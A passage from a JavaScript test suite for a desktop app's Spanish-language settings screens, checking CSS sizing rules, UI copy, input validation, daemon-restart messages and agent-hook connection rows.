  assert.match(readme, /abito_account_remove/, 'README names the closed verb behind it');
  // S4 pinned at the source: every field, the three credential options, clear-before-IPC
  const src = read(path.join(frontend, 'settings.js'));
  for (const field of ['account-provider', 'account-name', 'account-url', 'account-api', 'account-models', 'account-default', 'account-credential', 'account-secret', 'account-save', 'account-endpoint']) {
    assert.ok(src.includes(field), `manual editor field ${field}`);
  }
  for (const label of ['Conservar', 'Establecer clave', 'Borrar clave']) assert.ok(src.includes(label), `credential option ${label}`);
  assert.match(src, /secret\.value = ''/, 'the secret field is cleared, never retained');
  assert.match(src, /removeAccount\(account\.accountId\)/, 'the row wires removal through the closed verb');
  // a public check must keep pinning the removal sentences (S5) and the manual path (S4)
  const pills = read(path.join(__dirname, 'pills-check.cjs'));
  assert.ok(pills.includes('Conexión quitada. La clave se borró del almacén de Abito.'), 'pills-check pins the removal success sentence');
  // the failure sentence lives in a regex literal in pills-check (backslash-escaped dots)
  assert.ok(pills.includes('No se pudo quitar la conexión') && pills.includes('No se cambió nada'), 'pills-check pins the removal failure sentence');
  assert.ok(pills.includes('account-credential'), 'pills-check drives the manual credential options');
});

// ---- #410 Conexiones compacta (S1-S3): denser type and spacing INSIDE that tab only -----------------
const bareCss = () => fs.readFileSync(path.join(frontend, 'style.css'), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '');
const COMPACT_SCOPE = '#settings-body[data-screen="accounts"]';
const compactBlock = () => {
  const bare = bareCss();
  const at = bare.indexOf(COMPACT_SCOPE);
  assert.ok(at >= 0, 'the #410 compact block exists (scoped to the Conexiones tabpanel)');
  return bare.slice(at);
};

test('#410 scope: the open sub-tab is a public DOM attribute, and every compact rule is scoped to Conexiones', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /body\.dataset\.screen = id/, 'settings.js publishes the open screen on the tabpanel');
  const bare = bareCss();
  // written AFTER the #408 rail rules it densifies, so it wins at equal specificity
  assert.ok(bare.indexOf(COMPACT_SCOPE) > bare.indexOf('#settings[data-rail="true"] .sagent'),
    'the compact block comes after the rail block');
  const rules = [...compactBlock().matchAll(/(^|\n)([^{}\n][^{}]*)\{([^}]*)\}/g)];
  assert.ok(rules.length >= 12, `compact rules found: ${rules.length}`);
  for (const m of rules) {
    assert.match(m[2], new RegExp(COMPACT_SCOPE.replace(/[.\[\]"]/g, c => '\\' + c)),
      `unscoped rule: ${m[2].trim()} — the other Ajustes tabs keep their look (S3)`);
  }
  // the bar (title + connection chip) and the per-tab hint live OUTSIDE the tabpanel, so the block
  // never names them: the shared chrome keeps its size on every tab
  assert.doesNotMatch(compactBlock(), /#settings-(?:conn|hint|bar|title)/, 'shared chrome is not compacted');
});

test('#410 compact sizing: V1 tokens only, one type step down, tighter rows — and every control keeps its 44px target', () => {
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  const block = compactBlock();
  const rule = sel => {
    const hits = [...block.matchAll(/(^|\n)([^{}\n][^{}]*)\{([^}]*)\}/g)]
      .filter(m => m[2].split(',').map(x => x.trim()).includes(sel));
    assert.ok(hits.length, `rule ${sel}`);
    return hits[hits.length - 1][3]; // the LAST matching rule wins in CSS
  };
  // S3: the compact block stays on the V1 --fs-* tokens (12px floor): no raw px font size at all
  assert.doesNotMatch(block, /font(?:-size)?:[^;}]*\d+(?:\.\d+)?px/, 'raw px font-size inside the compact block');
  assert.match(rule(`${COMPACT_SCOPE} .srow-title`), /font-size: var\(--fs-label\)/);  // 14px -> 13px
  assert.match(rule(`${COMPACT_SCOPE} .snote`), /font-size: var\(--fs-caption\)/);     // 13px -> 12px
  assert.match(rule(`${COMPACT_SCOPE} .sline`), /font-size: var\(--fs-label\)/);       // 14px -> 13px
  assert.match(rule(`${COMPACT_SCOPE} .sbtn`), /font: 600 var\(--fs-label\)/);         // 14px -> 13px
  assert.match(rule(`${COMPACT_SCOPE} .chip`), /font-size: var\(--fs-caption\)/);      // 13px -> 12px
  // the approved design scale (DESIGN-NOTES §1/§3: row 40, row gap 8, group gap 20) replaces the
  // denser-than-design values this block used to pin; the type step-down and the 44px floor stay.
  assert.match(rule(`${COMPACT_SCOPE} .srow`), /min-height: 40px/);   // was 44px; design row 40
  assert.match(rule(`${COMPACT_SCOPE} .srow`), /gap: (?:8px|var\(--space-8\))/);           // was 6px; design row gap 8
  assert.match(rule(`${COMPACT_SCOPE} .srows`), /gap: (?:8px|var\(--space-8\))/);          // was 4px; design row gap 8
  assert.match(rule(`${COMPACT_SCOPE} .ssec`), /margin-top: 20px/);   // was 12px; design group gap 20
  assert.match(rule(`${COMPACT_SCOPE} .ssection`), /line-height: 18px/); // was 16px
  assert.match(rule(`${COMPACT_SCOPE} .sconn`), /margin: 0/);            // the list, not a card grid
  assert.match(rule(`${COMPACT_SCOPE} .sconn-row`), /flex-wrap: wrap/);  // a live login wraps to line 2
  assert.match(rule(`${COMPACT_SCOPE} .sconn-head .srow-title`), /text-overflow: ellipsis/);
  assert.match(rule(`${COMPACT_SCOPE} .sagent`), /padding: 6px 0/);   // was 12px 0 (rail)
  assert.match(rule(`${COMPACT_SCOPE} .srow-actions`), /gap: 4px/);   // was 6px
  assert.match(rule(`${COMPACT_SCOPE} .chip`), /min-height: 24px/);   // was 28px
  assert.match(rule(`${COMPACT_SCOPE} .sconn-row`), /flex-wrap: wrap/, '#410 r2: the compact list rows wrap their actions');
  // S3 click targets kept: the compact block densifies spacing/type, never the 44px floor
  assert.match(rule(`${COMPACT_SCOPE} .sbtn`), /min-height: 44px/);
  assert.match(rule(`${COMPACT_SCOPE} .sbtn`), /min-width: 44px/);
  assert.match(rule(`${COMPACT_SCOPE} .srow`), /min-height: 40px/);
  assert.match(css.match(/#settings-filter \{([^}]*)\}/)[1], /height: 44px/, 'the Conexiones search keeps its target');
  assert.match(css.match(/\.sfield \{([^}]*)\}/)[1], /min-height: 44px/, 'fields keep their target');
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /node\.style\.minHeight = '44px'/, 'the owned-account buttons keep their 44px anchor (#308)');
});

// ---- T6.1: the scale draws the 32px visual on an inset layer; the states must follow it ----------
// (coordinator requirement): buttons/tabs keep a 44px hit area and draw their visible 32px pill on
// ::after — so hover, selected, primary and the field's aria-invalid ring must be restated on the
// VISIBLE layer, never only on the transparent hit layer, or the states would be lost.
test('T6.1 visible-layer contract: hover, selected, primary and aria-invalid paint the ::after visual, not the hit layer', () => {
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  const rule = sel => { const i = css.lastIndexOf(sel + ' {'); assert.ok(i >= 0, `${sel} exists`); return css.slice(i, css.indexOf('}', i)); };
  // the visual layer exists, inset, with the visible radius on it (not on the 44px element)
  assert.match(rule('.sbtn::after'), /inset:\s*6px/, 'button visual: 44px element, 32px visual');
  assert.match(rule('.sbtn::after'), /z-index:\s*-1/, 'the visual sits behind the label');
  // hover, primary and the selected tab paint the visible layer
  assert.match(rule('.sbtn:hover::after'), /background:/, 'hover paints the visible pill');
  assert.match(rule('.sbtn.primary::after'), /background:\s*var\(--go\)/, 'primary paints the visible pill');
  assert.match(rule('.stab::after'), /inset:\s*4px/, 'tab visual: 44px element, 36px visual');
  assert.match(rule('.stab[aria-selected="true"]::after'), /border-color:\s*var\(--go\)/, 'the selected tab paints the visible layer');
  assert.match(rule('.stab:hover::after'), /background:/, 'tab hover paints the visible layer');
  // fields have no ::after (inputs cannot): the aria-invalid ring is the inset box-shadow, which
  // tracks the visible field edge, not the invisible 6px hit border
  const invalid = rule('#settings-display-name[aria-invalid="true"]');
  assert.match(invalid, /box-shadow:.*var\(--red-11\)/, 'aria-invalid rings the visible field');
  assert.doesNotMatch(invalid, /border-color:/, 'the invisible hit border never paints');
});

// T7.2 audit: the controls this unit added keep the 44px hit area (design: 32 visual / 44 hit).
test('T7.2 controls: theme thumbnails and service actions keep a 44px hit area; the visual layer is inset', () => {
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  const rule = sel => { const i = css.lastIndexOf(sel + ' {'); assert.ok(i >= 0, `${sel} exists`); return css.slice(i, css.indexOf('}', i)); };
  assert.match(rule('.stheme.stheme-card'), /min-height: 44px/);
  assert.match(rule('.stheme.stheme-card'), /min-width: 92px/);
  assert.match(rule('.int-actions button'), /min-height: 44px/);
  assert.match(rule('.int-actions button'), /min-width: 44px/);
  assert.match(rule('.int-actions button::after'), /inset: 6px/, 'service buttons: 44px element, 32px visual');
  assert.match(rule('.switch'), /height: 44px/);
  assert.match(rule('.models-prov-model'), /min-height: 44px/);
});

// ---- #390 GD027: the manual restart of the island agent daemon (Ajustes → Conexiones) --------
test('#390 GD027: the restart control is one closed neutral label with honest outcomes', () => {
  const idle = S.daemonRestartView();
  // T7.2 design (ajustes-ventana-conexiones-*.png): the Motor group is «Motor local» with the
  // «Último estado conocido» sub line; the button word is the design's own «Reiniciar». Was: 'Reiniciar motor'.
  assert.equal(idle.title, 'Motor');
  assert.equal(idle.rowTitle, 'Motor local');
  assert.equal(idle.rowSub, 'Último estado conocido');
  assert.equal(idle.action.label, 'Reiniciar');
  assert.equal(idle.action.disabled, false);
  assert.ok(idle.title.length > 0, 'the section names itself');
  assert.ok(!('hint' in idle), 'the design gives the Motor row a sub line, not a hint paragraph');
  const busy = S.daemonRestartView(true);
  assert.equal(busy.action.label, 'Reiniciando…');
  assert.equal(busy.action.disabled, true, 'one restart at a time, from the button itself');
  const ok = S.daemonRestartOutcome({ action: 'restart', ready: true });
  assert.deepEqual([ok.tone, ok.icon], ['go', 'check']);
  assert.match(ok.say, /reiniciado/i);
  const late = S.daemonRestartOutcome({ action: 'restart', ready: false });
  assert.equal(late.tone, 'sun');
  assert.ok(late.say.length > 5, 'a timeout is said out loud, never as success');
  const failed = S.daemonRestartOutcome(null, { code: 'host_spawn_failed' });
  assert.equal(failed.tone, 'red');
  assert.ok(!failed.say.includes('host_spawn_failed'), 'no host text leaks into Ajustes');
  // Neutral phrasing on purpose: #305's `portal_rejected` wording belongs to that worker,
  // and neither tokens nor engine text may ever appear in this panel.
  const all = JSON.stringify([idle, busy, ok, late, failed]);
  assert.ok(!all.includes('portal'), 'the hotkey portal wording is not ours to write');
  assert.ok(!all.includes('token') && !all.includes('sk-'));
});

// ---- #390 fix: the closed `outcome` drives the sentence ----------------------------------------
test('#390 GD027 fix: outcome drives the sentence — restarted/refused/timeout, closed and ours', () => {
  const restarted = S.daemonRestartOutcome({ action: 'restart', ready: true, connection: 'connected', outcome: 'restarted' });
  assert.deepEqual([restarted.tone, restarted.icon, restarted.say], ['go', 'check', 'Motor reiniciado.']);
  // the coordinator's verbatim sentence, no engine text
  const refused = S.daemonRestartOutcome({ action: 'restart', ready: false, connection: 'no_daemon', outcome: 'refused' });
  assert.equal(refused.say, 'Hay un motor ajeno en uso; no lo puedo reiniciar desde acá.');
  const timeout = S.daemonRestartOutcome({ action: 'restart', ready: false, connection: 'no_daemon', outcome: 'timeout' });
  assert.equal(timeout.say, 'El motor no respondió a tiempo; volvé a probar en un momento.');
  assert.equal(timeout.tone, 'sun');
  // refused and timeout are distinct states, never success
  assert.notEqual(refused.say, restarted.say);
  assert.ok(refused.tone !== 'go', 'a refused restart never reads as success');
  // the previous contract (a reply without the closed outcome) keeps its meaning
  assert.deepEqual([S.daemonRestartOutcome({ action: 'restart', ready: true }).say, S.daemonRestartOutcome({ action: 'restart', ready: false }).tone], ['Motor reiniciado.', 'sun']);
  assert.equal(S.daemonRestartOutcome(null, { code: 'host_spawn_failed' }).tone, 'red');
  const all = JSON.stringify([restarted, refused, timeout]);
  assert.ok(!all.includes('portal') && !all.includes('token') && !all.includes('sk-'), 'no foreign wording');
});

// ---- #336 F003/F004: island inactivity interaction -------------------------------------------------
test('F003 the interaction view-model reads the typed pair with 15s/hover-off defaults and no coercion', () => {
  assert.deepEqual(S.islandInteractionView(undefined), { autoCloseSeconds: 15, openOnHover: false });
  assert.deepEqual(S.islandInteractionView({}), { autoCloseSeconds: 15, openOnHover: false });
  assert.deepEqual(S.islandInteractionView({ autoCloseSeconds: 45, openOnHover: true }), { autoCloseSeconds: 45, openOnHover: true });
  assert.deepEqual(S.islandInteractionView({ autoCloseSeconds: 5, openOnHover: false }), { autoCloseSeconds: 5, openOnHover: false });
  assert.deepEqual(S.islandInteractionView({ autoCloseSeconds: 120 }), { autoCloseSeconds: 120, openOnHover: false });
  assert.deepEqual(S.islandInteractionView({ autoCloseSeconds: 0, openOnHover: true }),
    { autoCloseSeconds: 0, openOnHover: true }, '#438: «Nunca» (0) reads as stored, never clamped');
  // hostile/foreign values read as the defaults, each field independently
  for (const bad of [{ autoCloseSeconds: 4 }, { autoCloseSeconds: 121 }, { autoCloseSeconds: 15.5 },
    { autoCloseSeconds: '15' }, { autoCloseSeconds: null }, { autoCloseSeconds: Infinity }, { autoCloseSeconds: NaN }]) {
    assert.deepEqual(S.islandInteractionView(bad), { autoCloseSeconds: 15, openOnHover: false }, JSON.stringify(bad));
  }
  assert.deepEqual(S.islandInteractionView({ openOnHover: 'true' }), { autoCloseSeconds: 15, openOnHover: false });
  assert.deepEqual(S.islandInteractionView({ openOnHover: 1 }), { autoCloseSeconds: 15, openOnHover: false });
  assert.deepEqual(S.islandInteractionView({ autoCloseSeconds: 45, openOnHover: 'yes' }),
    { autoCloseSeconds: 45, openOnHover: false }, 'the fields fall back independently');
});

test('F003 the delay field accepts 0 («Nunca») or canonical integers 5..120, and says so honestly otherwise', () => {
  for (const value of ['0', 0, '5', '45', '120', '15', 5, 15, 120, ' 15 ']) assert.equal(S.autoCloseProblem(value), '', JSON.stringify(value));
  const message = 'Ingresá 0 (nunca) o un entero entre 5 y 120 segundos.';
  for (const value of ['', ' ', '4', '121', '-5', '15.5', '1e2', '+5', 'junk', 'Infinity', 'NaN', null, undefined, 15.5, {}, true]) {
    assert.equal(S.autoCloseProblem(value), message, JSON.stringify(value));
  }
});

test('#336 settings UI source contract: the closed pair payload, validation before save, honest failure and the hover toggle', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  // the ONE closed command, always carrying the full typed pair
  assert.match(src, /action: 'set_island_interaction', auto_close_seconds:/);
  assert.match(src, /open_on_hover:/);
  assert.doesNotMatch(src, /set_island_interaction[^\n]*auto_close_seconds:\s*autoCloseSeconds(?!,)/);
  // validation gate: the view-model validator drives the segmented choice before any save
  assert.match(src, /V\.autoCloseProblem\(/);
  assert.match(src, /settings-autoclose-error/);
  // honest invalid values: the issue text is shown in the segmented control's error line
  // (T6.3 #434: the number field became a segmented control — before: aria-invalid on the input)
  assert.match(src, /settings-autoclose-options/);
  // honest save failure: the value did not change
  assert.match(src, /No se pudo guardar\. La interacción sigue sin cambios/);
  // hover toggle through the same closed pair, with an honest failure too
  assert.match(src, /sw-island-hover/);
  assert.match(src, /say\('No se pudo guardar\. La interacción sigue sin cambios/);
  // the new section never writes raw pixels
  assert.doesNotMatch(src, /auto[Cc]lose[^\n]*\d+px/);
});

// T6.3 #434 General screen contract: volume slider (design wins, D6), segmented auto-close with
// the existing 5..120 contract, Perfil/Isla/Sonido groups, copy diet. Honest failure texts stay.
test('T6.3 General screen source contract: slider, segmented auto-close, groups, copy diet', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  // volume slider through the closed command; the number field is gone
  assert.match(src, /gainInput\.type = 'range'/);
  assert.doesNotMatch(src, /gainInput\.type = 'number'/);
  assert.match(src, /settings-sound-gain/);
  assert.match(src, /aria-valuetext/);
  assert.match(src, /V\.gainPercent\(/);
  // validation gate and honest failure behaviour survive the slider swap
  assert.match(src, /V\.soundGainProblem\(/);
  assert.match(src, /No se pudo guardar\. El volumen sigue sin cambios/);
  // segmented auto-close: presets render, «Nunca» is a real enabled choice (#438), the closed pair stays
  assert.match(src, /V\.autoCloseSegments\(/);
  assert.doesNotMatch(src, /Próximamente/);
  assert.match(src, /action: 'set_island_interaction', auto_close_seconds: seconds, open_on_hover:/);
  assert.match(src, /settings-autoclose-error/);
  assert.match(src, /No se pudo guardar\. La interacción sigue sin cambios/);
  // #460 E2: separate sound and shortcut groups, retaining the existing controls.
  assert.match(src, /'Perfil'/);
  assert.match(src, /'Isla'/);
  assert.match(src, /group\('general', 'Sonido'\)/);
  assert.match(src, /group\('general', 'Atajo global'\)/);
  assert.doesNotMatch(src, /'Abrir Ajustes en ventana'/, '#455 S8: placement is no longer optional');
  assert.match(src, /'Atajo global'/);
  // copy diet: the explanatory paragraphs of the General screen are gone
  assert.doesNotMatch(src, /Dónde se abre Ajustes/);
  assert.doesNotMatch(src, /Avisos sonoros de la isla/);
  assert.doesNotMatch(src, /Abre y oculta la isla/);
  assert.doesNotMatch(src, /Sólo para saludarte/);
  assert.doesNotMatch(src, /Se cierra sola después/);
  assert.doesNotMatch(src, /De 0 a 0,2/);
});

// ---- #366 F093: the opt-in settings window ----------------------------------------------------------

test('F093 isSettingsWindow admits only the exact lowercase settings label', () => {
  assert.equal(S.isSettingsWindow('settings'), true);
  assert.equal(S.isSettingsWindow('main'), false);
  assert.equal(S.isSettingsWindow('Settings'), false, 'exact match only');
  assert.equal(S.isSettingsWindow('settings2'), false);
  assert.equal(S.isSettingsWindow(''), false);
  assert.equal(S.isSettingsWindow(null), false);
  assert.equal(S.isSettingsWindow(undefined), false);
  assert.equal(S.isSettingsWindow(42), false);
});

test('F093 the settings window view models the General toggle from the projection only', () => {
  // absent projection = the in-island default; only an explicit true opts in
  assert.deepEqual(S.settingsWindowView({}), { on: false });
  assert.deepEqual(S.settingsWindowView({ settingsWindow: false }), { on: false });
  assert.deepEqual(S.settingsWindowView({ settingsWindow: true }), { on: true });
  assert.deepEqual(S.settingsWindowView(null), { on: false });
  assert.deepEqual(S.settingsWindowView('junk'), { on: false });
});

test('#455 S8 replaces island settings with the standalone window and preserves gates', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /if \(!WINDOW_MODE\) return openSettingsWindow\(\)/);
  assert.doesNotMatch(src, /openWindowOrInIsland|set_settings_window|settings-window-open|sw-settings-window/);
  assert.match(src, /dataset\.window = 'settings'/);
  const native = fs.readFileSync(path.join(frontend, '../src/settingswindow.rs'), 'utf8');
  assert.match(native, /WebviewWindowBuilder|fn open_window/);
  assert.doesNotMatch(native, /crate::open_settings_in_island\(&app, &state\)/);
  assert.doesNotMatch(native, /if !opens_own_window/);
  const main = fs.readFileSync(path.join(frontend, '../src/main.rs'), 'utf8');
  // #498: the in-island Settings route was dead code (no caller) and is gone for good.
  assert.doesNotMatch(main, /fn open_settings_in_island\(/);
  assert.match(native, /bridge::sender_ok\(webview.label\(\), &url\)\?/);
  assert.match(native, /chat_rate[\s\S]*?\.check\(crate::now_ms\(\)\)\?/);
  // #503 S26: the command validates its payload with the closed request parser (action + optionally ONE page of Rust's own list);
  // the original action-only parser stays as the narrower contract
  assert.match(native, /parse_settings_window_request\(&payload\)/);
  assert.match(native, /pub\(crate\) fn parse_settings_window_action\(/);
  assert.match(native, /PAGES\.iter\(\)\.copied\(\)\.find\(\|p\| \*p == wanted\)/, 'the page must be matched against the closed list, never interpolated from the payload');
});

// ---- #366 F094: the quick panel inside the island -------------------------------------------------

test('F094 quickPanelView projects exactly sound, theme and auto-close from the saved prefs', () => {
  const v = S.quickPanelView({ sound: true, theme: 'dark', autoCloseSeconds: 45 });
  assert.equal(v.sound.on, true);
  assert.deepEqual(v.theme.map(o => [o.id, o.selected]), [['system', false], ['light', false], ['dark', true]]);
  assert.equal(v.autoCloseSeconds, 45);
  const d = S.quickPanelView({});
  assert.equal(d.sound.on, false);
  assert.equal(d.theme.find(o => o.selected).id, 'system');
  assert.equal(d.autoCloseSeconds, 15, 'the contract default');
  assert.equal(S.quickPanelView(null).autoCloseSeconds, 15);
  assert.deepEqual(Object.keys(v).sort(), ['autoCloseSeconds', 'sound', 'theme']);
});

test('#366 quick panel contract: right-click on the gear, existing closed prefs commands only, normal click untouched', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /addEventListener\('contextmenu'/);
  assert.match(src, /V\.quickPanelView\(/);
  assert.match(src, /chooseTheme\(option\.id\)/, 'the quick theme reuses the one closed theme sender');
  assert.match(src, /'sound_on'/);
  assert.match(src, /action: 'set_island_interaction'/);
  assert.match(src, /V\.autoCloseProblem\(/);
  assert.doesNotMatch(src, /long-?press|longpress/i, 'no long-press gesture');
});

test('R16 cancel plan: binds to the flow this row started; no flow yet means a local clear, never an empty id', () => {
  assert.deepEqual(S.cancelPlan({ providerId: 'openai', phase: 'active', sawFlow: false }), { kind: 'local' });
  assert.deepEqual(S.cancelPlan({ providerId: 'openai', phase: 'active', sawFlow: true, flowId: '' }), { kind: 'local' });
  assert.deepEqual(S.cancelPlan({ providerId: 'openai', phase: 'active', sawFlow: true, flowId: 'f-7' }), { kind: 'send', flowId: 'f-7' });
  assert.deepEqual(S.cancelPlan(null), { kind: 'local' });
});

// ---- HU-015: Agentes rows come from the daemon-free host route; the chat engine plays no part ----------------
const HU15_HASH = 'a'.repeat(64);
const HU15_SUMMARY = 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first.';
const direct = (agents, extra = {}) => ({ agentsRuntime: 'ok', directAgents: agents, directHooks: [], ...extra });
test('HU-015 S2: engine down, Pi missing — Claude Code and Codex are still installable, and nothing says «Falta Pi»', () => {
  const st = { connection: 'no_daemon', last_error: { code: 'pi_missing', n: 1 }, ...direct([
    { id: 'claude-code', state: 'not_connected', backup: false, detail: null, plan_hash: HU15_HASH, summary: HU15_SUMMARY, reviewable: true },
    { id: 'codex', state: 'not_connected', backup: false, detail: null, plan_hash: 'b'.repeat(64), summary: HU15_SUMMARY, reviewable: true }]) };
  const v = S.agentsView(st);
  assert.equal(v.kind, 'ready', 'rows render although the engine is down');
  const by = Object.fromEntries(v.rows.map(r => [r.id, r]));
  assert.equal(by['claude-code'].primary.label, 'Agregar hooks');
  assert.deepEqual(by['claude-code'].primary.command, { action: 'agent_connect', agentId: 'claude-code', plan_hash: HU15_HASH });
  assert.equal(by['codex'].primary.label, 'Agregar hooks');
  assert.ok(!JSON.stringify(v).includes('Falta Pi') && !JSON.stringify(v).includes('Sin motor'));
});
test('HU-015 S1/S3: each row depends only on its own hooks; an uninstalled agent reads disabled with the install action', () => {
  const v = S.agentsView(direct([
    { id: 'claude-code', state: 'connected', backup: true, detail: null },
    { id: 'codex', state: 'not_connected', backup: false, detail: null, plan_hash: HU15_HASH, summary: HU15_SUMMARY, reviewable: true },
    { id: 'opencode', state: 'error', backup: false, detail: 'config_invalid' }]));
  const by = Object.fromEntries(v.rows.map(r => [r.id, r]));
  assert.equal(by['claude-code'].word, 'Conectado');
  assert.equal(by['claude-code'].secondary.label, 'Desconectar');
  assert.equal(by['codex'].word, 'Sin conectar');
  assert.equal(by['codex'].tone, 'faint');
  assert.ok(by['codex'].primary && by['codex'].primary.label === 'Agregar hooks');
  assert.equal(by['opencode'].state, 'error');
  assert.equal(by['claude-code'].primary, null, 'a broken neighbour never changes a connected row');
});
test('HU-015: Pi missing never alters another row, whatever the engine connection says', () => {
  const list = [{ id: 'claude-code', state: 'connected', backup: false, detail: null }];
  const base = JSON.stringify(S.agentsView(direct(list)));
  for (const connection of ['connected', 'connecting', 'no_daemon', 'lost', 'refused', 'bad_session'])
    for (const last_error of [null, { code: 'pi_missing', n: 1 }, { code: 'node_missing', n: 2 }])
      assert.equal(JSON.stringify(S.agentsView({ ...direct(list), connection, last_error })), base, `${connection}/${last_error && last_error.code}`);
});
test('HU-015: missing Node.js is said per row (the only runtime message), never as Pi or as a whole-screen engine error', () => {
  const v = S.agentsView({ connection: 'no_daemon', agentsRuntime: 'node_missing', directAgents: [], directHooks: [] });
  assert.equal(v.kind, 'ready');
  assert.ok(v.rows.length >= 6 && v.rows.every(r => r.word === 'Falta Node.js' && !r.primary && !r.secondary));
  assert.ok(!/Falta Pi/.test(JSON.stringify(v))); // Pi's own NAME is now a valid independent row.
  const failed = S.agentsView({ agentsRuntime: 'failed' });
  assert.ok(failed.rows.every(r => r.word === 'No se pudo'));
});
test('HU-015: the existing engine path (no direct answer yet) is unchanged — the chat diagnostics still say «Falta Pi»', () => {
  assert.equal(S.agentsView(state({ connection: 'no_daemon', agents: null })).kind, 'no_engine');
  const missing = S.connectionView({ connection: 'no_daemon', last_error: { code: 'pi_missing', n: 1 } });
  assert.equal(missing.word, 'Falta Pi');
});
test('HU-015: a direct retry without a shown plan only refreshes the preview', () => {
  const row = S.agentsView(direct([{ id: 'codex', state: 'error', detail: 'install_failed' }])).rows.find(r => r.id === 'codex');
  assert.deepEqual(row.primary.command, { action: 'agents_list' });
});
test('HU-015: directOutcome reports only the host answer for THAT agent', () => {
  assert.equal(S.directOutcome(direct([{ id: 'codex', state: 'connected' }]), 'codex', 'ok').ok, true);
  assert.equal(S.directOutcome(direct([{ id: 'codex', state: 'error', detail: 'plan_changed' }]), 'codex', 'ok').ok, false);
  assert.equal(S.directOutcome(direct([{ id: 'claude-code', state: 'connected' }]), 'codex', 'ok').ok, false);
  assert.equal(S.directOutcome({ agentsRuntime: 'failed' }, 'codex', 'ok').ok, false);
  assert.match(S.directOutcome({ agentsRuntime: 'node_missing' }, 'codex', 'ok').say, /Node\.js/);
  assert.equal(S.directOutcome(null, 'codex', 'ok').ok, false);
});
